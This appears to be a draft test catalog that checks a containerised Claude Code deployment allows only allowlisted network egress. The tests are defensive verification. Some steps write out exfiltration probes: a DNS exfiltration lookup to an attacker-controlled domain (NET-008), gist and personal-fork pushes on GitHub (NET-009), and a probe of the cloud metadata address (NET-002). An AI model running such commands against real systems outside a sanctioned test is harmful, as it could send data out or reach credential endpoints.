---
title: "Catalog: NET, network egress"
status: Draft
owner: <evaluation-lead>
last_updated: 2026-10-19
version: 0.2
phase: 1
---

# NET: Network egress

[🏠 Home](../../../README.md) › [Test strategy](../test-strategy.md) › NET

These tests prove that only allowlisted egress succeeds from any process in the container, and that Claude Code makes no unexpected vendor connections. Reference: [network-egress.md](../../01-architecture/network-egress.md), [network config docs](https://code.claude.com/docs/en/network-config).

## Summary

| ID | Test | Pri | Controls | Result |
|---|---|---|---|---|
| [NET-001](#net-001) | Firewall default-denies and allows the allowlist | P0 | CTL-04 | ⏳ |
| [NET-002](#net-002) | Non-allowlisted hosts unreachable from any process | P0 | CTL-04 | ⏳ |
| [NET-003](#net-003) | No nonessential vendor traffic in a full session | P0 | CTL-19 | ⏳ |
| [NET-004](#net-004) | Foundry endpoint works end to end | P0 | CTL-16 | ⏳ |
| [NET-005](#net-005) | Corporate proxy + TLS inspection | P1 | CTL-05 | ⏳ |
| [NET-006](#net-006) | WebFetch behavior and preflight | P1 | CTL-26, CTL-19 | ⏳ |
| [NET-007](#net-007) | WebSearch unavailable in every session type | P0 | CTL-26 | ⏳ |
| [NET-008](#net-008) | DNS exfiltration blocked or logged | P1 | CTL-04 | ⏳ |
| [NET-009](#net-009) | github.com exfil path closed by the scoped token | P0 | CTL-17 | ⏳ |
| [NET-010](#net-010) | Package installs via the internal mirror only | P1 | CTL-04 | ⏳ |
| [NET-011](#net-011) | mTLS client certificates (if required) | P2 | CTL-05 | ⏳ |
| [NET-012](#net-012) | Egress logs captured for audit | P1 | CTL-05 | ⏳ |
| [NET-013](#net-013) | IPv6 egress blocked | P2 | CTL-04 | ⏳ |
| [NET-014](#net-014) | Container firewall holds on an internet-connected host | P0 | CTL-04, CTL-10 | ⏳ |
| [NET-015](#net-015) | Off the VPN, sessions fail closed | P1 | CTL-24, CTL-27 | ⏳ |
| [NET-016](#net-016) | Private DNS and Foundry private endpoint [verify] | P1 | CTL-27, CTL-16 | ⏳ |

---

<a id="net-001"></a>
### NET-001 · Container firewall default-denies egress and allows the allowlist

**Priority** P0 · **Controls** CTL-04 · **Risks** R-06

**Steps.** In the container terminal (not via Claude), for each allowlisted destination in [network-egress.md](../../01-architecture/network-egress.md#allowlist): `curl -sS -o /dev/null -w '%{http_code}\n' https://<host>`. Then check that the firewall rule set has a default-DROP policy (from an admin context, or via the init log).

**Expected.** All allowlisted hosts reachable. Policy is DROP/REJECT by default.

**Result.** ⏳ · `evidence/NET-001/`

<a id="net-002"></a>
### NET-002 · Non-allowlisted hosts are unreachable from any process

**Priority** P0 · **Controls** CTL-04 · **Risks** R-06, R-09

**Steps.** From the container terminal **and** through Claude, try: `example.com`, `pastebin.com`, `registry.npmjs.org`, `pypi.org`, `169.254.169.254`, a non-allowlisted internal IP, `api.anthropic.com`, and raw TCP to port 22 or 25. Use curl, python, node, `nc`, `openssl s_client`.

**Expected.** Every attempt fails (connection refused or timeout). The canary host receives nothing.

**Result.** ⏳ · `evidence/NET-002/`

<a id="net-003"></a>
### NET-003 · No nonessential vendor traffic during a full session

**Priority** P0 · **Controls** CTL-19 · **Risks** R-07 · **Docs** [data usage](https://code.claude.com/docs/en/data-usage), [network config](https://code.claude.com/docs/en/network-config)

**Objective.** Prove which hosts Claude Code actually contacts with our configuration, rather than assuming.

**Steps.**
1. Temporarily switch the firewall to **log-and-allow** for this test only, on an isolated test VDI, with proxy logging on. Alternatively, keep deny but log every dropped connection with the destination name.
2. Run a 30-minute session that exercises every feature: plan mode, edits, Bash, subagents, WebFetch, `/usage`, `/status`, `/doctor`, `/compact`, `/resume`, skills, `/code-review`, the `/feedback` attempt, a crash (kill -9), and a restart.
3. Collect all destinations (DNS log + proxy log).

**Expected.** Only the Foundry endpoint, Entra, GitHub, the mirror, and the OTel collector. Any Anthropic, Datadog, statsig, or other host is listed with the triggering feature. Each becomes a finding plus a decision (block or allow).

**Evidence.** `egress-summary.csv` (destination, count, first seen, triggering action).

**Result.** ⏳ · `evidence/NET-003/`

<a id="net-004"></a>
### NET-004 · Foundry endpoint works end to end

**Priority** P0 · **Controls** CTL-16 · **Docs** [Foundry](https://code.claude.com/docs/en/microsoft-foundry)

**Steps.** Start Claude Code. `/status` shows provider "Microsoft Foundry" and the resource. Send a prompt for each pinned model (`/model opus`, `sonnet`, `haiku`). Use OTel `api_request` events to confirm the deployment names.

**Expected.** All three deployments respond. No 404s or model-not-found errors. Note: deployments must be named with model IDs, or mapped with `modelOverrides`, for 1M context and full tool availability (the docs warn that custom names may lose some tools [verify]).

**Result.** ⏳ · `evidence/NET-004/`

<a id="net-005"></a>
### NET-005 · Corporate proxy and TLS inspection work with `NODE_EXTRA_CA_CERTS`

**Priority** P1 · **Controls** CTL-05

**Steps.** With `HTTPS_PROXY` and the corporate CA configured, run a session. Remove `NODE_EXTRA_CA_CERTS` temporarily to confirm the failure mode. Check the proxy log for Claude Code requests.

**Expected.** Works with the CA. Without it, a clear TLS error. Requests are visible in the proxy log. If bodies fail through the inspecting proxy, test `CLAUDE_CODE_GZIP_REQUEST_BODIES=0`.

**Result.** ⏳ · `evidence/NET-005/`

<a id="net-006"></a>
### NET-006 · WebFetch behavior and preflight

**Priority** P1 · **Controls** CTL-26, CTL-19

**Steps.** Ask Claude to fetch an allowed docs URL. Capture egress. Check whether a domain-safety preflight request goes to `api.anthropic.com` (blocked by the firewall). If it's blocked and WebFetch then fails, test `skipWebFetchPreflight: true` in a test policy.

**Expected.** Record the actual behavior. The v0.2 policy disables WebFetch and sets `skipWebFetchPreflight: true` ([ADR-016](../../../logs/decision-log.md#adr-016)), so under the final policy no preflight request is made. Keep this test for the case where WebFetch is turned back on.

**Result.** ⏳ · `evidence/NET-006/`

<a id="net-007"></a>
### NET-007 · WebSearch is unavailable in every session type

**Priority** P0 · **Controls** CTL-26 · **Risks** R-06, R-09

**Steps.** In an interactive session, ask Claude to search the web for something current. Check whether the WebSearch tool is offered or called (audit hook log, OTel `tool_decision`). Repeat in headless `claude -p`, in a built-in subagent and a custom subagent with `tools: WebSearch`, with `--allowedTools WebSearch`, with a project `.claude/settings.json` allow rule, and after trying to allow it in `/permissions`. Repeat in the gateway stage.

**Expected.** WebSearch never runs. It's denied or absent in every case. On Foundry the search runs on the server side, so the firewall can't stop it, and this test is the only proof ([ADR-016](../../../logs/decision-log.md#adr-016)).

**Result.** ⏳ · `evidence/NET-007/`

<a id="net-008"></a>
### NET-008 · DNS exfiltration attempt is blocked or logged

**Priority** P1 · **Controls** CTL-04

**Steps.** `dig $(echo canary | base32).<attacker-controlled-domain>` and `nslookup … 8.8.8.8` from the terminal and via Claude.

**Expected.** External resolvers unreachable. The internal resolver either refuses unknown external zones or logs the query, and the security team can see it. Record which.

**Result.** ⏳ · `evidence/NET-008/`

<a id="net-009"></a>
### NET-009 · github.com exfil path is closed by the scoped token

**Priority** P0 · **Controls** CTL-17 · **Risks** R-06

**Steps.** Using the dev's token in the container: `git clone https://github.com/<org>/claude-eval-forbidden`, `gh repo create`, `gh gist create file.txt`, push to a personal fork, and `gh api /user/repos`.

**Expected.** All fail: token scope, plus deny rules for `gh gist`/`gh repo create`. Pushing is only possible to `<org>/<repo>`.

**Result.** ⏳ · `evidence/NET-009/`

<a id="net-010"></a>
### NET-010 · Package installs go through the internal mirror only

**Priority** P1 · **Controls** CTL-04 · **Risks** R-20

**Steps.** `npm install lodash`, `pip install requests`, and so on, with mirror config (should work) and without it (should fail, because the public registry is blocked).

**Expected.** The mirror works. Public registries fail.

**Result.** ⏳ · `evidence/NET-010/`

<a id="net-011"></a>
### NET-011 · mTLS client certificates (if required)

**Priority** P2 · **Controls** CTL-05 · **Docs** [network config](https://code.claude.com/docs/en/network-config)

**Steps.** Only if the proxy or gateway requires mTLS. Configure `CLAUDE_CODE_CLIENT_CERT` / `_KEY` / `_KEY_PASSPHRASE` and test.

**Expected.** Works, or ⏭ N/A with the reason.

**Result.** ⏳ · `evidence/NET-011/`

<a id="net-012"></a>
### NET-012 · Egress logs are captured for audit

**Priority** P1 · **Controls** CTL-05

**Steps.** After NET-002, ask the network/security team to find the blocked attempts in the proxy or firewall logs, by container or VDI identity and timestamp.

**Expected.** Each blocked attempt can be found and attributed to the VDI/user within « 1 h ».

**Result.** ⏳ · `evidence/NET-012/`

<a id="net-013"></a>
### NET-013 · IPv6 egress is also blocked

**Priority** P2 · **Controls** CTL-04

**Steps.** `curl -6 https://ipv6.google.com` (or another IPv6-only host). `ip -6 addr`.

**Expected.** IPv6 is disabled in the container, or blocked equally.

**Result.** ⏳ · `evidence/NET-013/`

<a id="net-014"></a>
### NET-014 · Container firewall holds on a host that has internet access

**Priority** P0 · **Controls** CTL-04, CTL-10 · **Risks** R-23, R-06

**Steps.** On a test VDI or PC whose host has normal internet access (not the isolated segment, [ADR-018](../../../logs/decision-log.md#adr-018)), start the same image and policy. From the host, confirm `https://example.com` loads. From the container (as `dev`, through `!`, and through Claude's sandboxed Bash) try `example.com`, `pypi.org`, `registry.npmjs.org`, `api.anthropic.com`, and an IP literal. Repeat the core checks of [NET-001](#net-001), [NET-002](#net-002), and [SBX-005](sandbox.md#sbx-005).

**Expected.** Everything except the allowlist is blocked inside the container, even though the host can reach it. Any leak is a 🟥 Blocker for the PC rollout.

**Result.** ⏳ · `evidence/NET-014/`

<a id="net-015"></a>
### NET-015 · Off the VPN, sessions fail closed

**Priority** P1 · **Controls** CTL-24, CTL-27 · **Risks** R-23

**Steps.** On the PC track, or on a VDI with the route removed, disconnect the VPN. Start Claude Code in the direct stage (Foundry unreachable) and in the gateway stage (signed-in session). Try a package install and `git fetch`. Reconnect.

**Expected.** Claude Code doesn't run without its gateway or provider. Gateway sessions exit at startup after about 10 seconds rather than starting without their settings. Nothing falls back to a public endpoint. The error is clear, and everything recovers on reconnect.

**Result.** ⏳ · `evidence/NET-015/`

<a id="net-016"></a>
### NET-016 · Private DNS and Foundry private endpoint; public access off [verify]

**Priority** P1 · **Controls** CTL-27, CTL-16 · **Risks** R-06

**Steps.** From the VDI and the container, resolve `<foundry-resource>.services.ai.azure.com` and the gateway name. Confirm the Foundry resource's public network access is disabled, and try to reach it from a network that isn't allowed. Run inference over the private endpoint [verify that Claude deployments support private endpoints].

**Expected.** Both names resolve to private IPs over ExpressRoute. The public path is closed. Inference works.

**Result.** ⏳ · `evidence/NET-016/`
